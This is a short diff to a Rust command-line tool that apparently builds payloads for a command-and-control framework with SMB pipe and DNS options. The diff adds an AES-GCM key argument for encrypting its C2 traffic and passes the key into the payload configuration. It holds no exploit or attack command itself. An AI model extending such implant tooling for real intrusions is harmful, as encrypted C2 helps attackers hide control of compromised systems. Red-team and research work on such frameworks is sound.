@@ -48,6 +48,10 @@ struct Args {
     /// Named pipe (for SMB protocol)
     #[arg(long)]
     pipe_name: Option<String>,
+
+    /// Hex-encoded 32-byte AES-GCM key. If omitted, plaintext comms.
+    #[arg(long, default_value = "")]
+    c2_key: String,
 }
 
 #[tokio::main]
@@ -84,6 +88,7 @@ async fn main() -> Result<()> {
         output_path: Some(output_path.clone()),
         dns_domain:  args.dns_domain,
         pipe_name:   args.pipe_name,
+        c2_key:      args.c2_key,
     };
 
     println!("[*] Generating {} payload…", format);
